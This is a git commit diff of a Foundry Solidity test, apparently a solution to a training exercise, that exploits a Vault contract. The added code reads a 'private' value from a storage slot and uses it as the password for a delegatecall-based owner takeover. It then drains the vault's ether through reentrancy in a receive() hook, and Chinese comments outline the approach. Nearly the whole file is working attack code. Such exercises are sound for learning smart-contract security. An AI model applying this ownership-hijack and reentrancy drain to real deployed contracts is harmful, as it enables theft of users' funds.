3ca0e3df72a45d003d6365da040e676de955d7e8
zaven <2avvv1n@gmail.com>
2024-11-09 01:08:40 +0800

    fix: vault attack

--- foundry_run/src/W5D5_Attack/Vault.t.sol
+++ foundry_run/src/W5D5_Attack/Vault.t.sol
@@ -2,56 +2,67 @@
 pragma solidity ^0.8.13;
 
 import "forge-std/Test.sol";
-import "./Vault.sol";
+import {VaultLogic,Vault} from "./Vault.sol";
+/**
+思路: 
+    可以重入攻击, 但是vault关闭提取就无法攻击
+    如果能解决修改owner那就可以为所欲为
 
-
+    1. 虽然是private, 但是还是可以通过插槽去读取, 使用assmebly?
+    2. 注意的是, 并不是EOA发起攻击, 而是合约, 所以需要设置player = address(this),
+       因为合约可以写fallback或者receive来重复调取withDraw
+ */
 contract VaultExploiter is Test {
-    Vault public vault;
-    VaultLogic public logic;
-
-    address owner = address (1);
-    address palyer = address (2);
+    VaultLogic vaultLogic;
+    Vault vault;
+    address owner = makeAddr("owner");
+    bool start_attack;
+    address player = address(this);
 
     function setUp() public {
         vm.deal(owner, 1 ether);
-
         vm.startPrank(owner);
-        logic = new VaultLogic(bytes32("0x1234"));
-        vault = new Vault(address(logic));
-
-        vault.deposite{value: 0.1 ether}();
+            bytes32 password = bytes32("0x98765433456");
+            vaultLogic = new VaultLogic(password);
+            vault = new Vault(address(vaultLogic));
+            vault.deposite{ value: 0.1 ether }();
         vm.stopPrank();
+    }
+    function test_owner() public {
+        vm.deal(player, 1 ether);
+        vm.startPrank(player);
+            console.log(player);
+            address logicAddress = address(uint160(uint256(vm.load(address(vault), bytes32(uint256(1))))));
+            callChangeOwner(vault, bytes32(uint256(uint160(address(logicAddress)))), player);
+            
+            // 判断是否成功修改owner
+            assertEq(vault.owner(), player);
 
+            // 开始攻击
+            vault.openWithdraw();
+            start_attack = true;
+            vault.deposite{ value: 0.01 ether }();
+
+            console2.log("vault balance before attack:", address(vault).balance);
+
+            vault.withdraw();
+
+            console2.log("vault balance after attack:", address(vault).balance);
+
+            require(vault.isSolve(), "solved");
+        vm.stopPrank();
+    }
+    function callChangeOwner(Vault vault1, bytes32 password, address newOwner) public {
+        bytes memory data = abi.encodeWithSignature("changeOwner(bytes32,address)", password, newOwner);
+        (bool success,) = address(vault1).call(data);
+        require(success, "changeOwner call failed");
     }
 
-    /**
-
-      要利用这个 Vault 合约并提取其中的所有资金，可以利用合约的 delegatecall 设计，
-      因为 Vault 合约会将传入的调用委托给 VaultLogic 合约，
-      这样调用者可以通过 delegatecall 来更改 Vault 合约的 owner 状态变量。
-
-      使用恶意 password 调用 VaultLogic.changeOwner 函数，并更改 Vault 的 owner。
-      调用 Vault.openWithdraw() 来启用提款权限。
-      调用 Vault.withdraw() 提取所有资金。
-    
-     */
-    function testExploit() public {
-      vm.deal(palyer, 1 ether);
-      vm.startPrank(palyer);
-        // 利用 fallback 机制调用 VaultLogic 的 changeOwner 函数，以更改 Vault 的 owner 为 palyer
-        (bool success, ) = address(vault).call(
-            abi.encodeWithSignature("changeOwner(bytes32,address)", bytes32("0x1234"), palyer)
-        );
-        require(success, "changeOwner failed");
-
-        // palyer 已经是 Vault 的 owner，调用 openWithdraw 函数来启用提现
-        vault.openWithdraw();
-
-        // 调用 withdraw 函数提取所有资金
-        vault.withdraw();
-
-        require(vault.isSolve(), "solved");
-      vm.stopPrank();
+    receive() external payable {
+        if (start_attack) {
+            console.log("-------attacked ------");
+            // start_attack = false;
+            vault.withdraw();
+        }
     }
-
 }
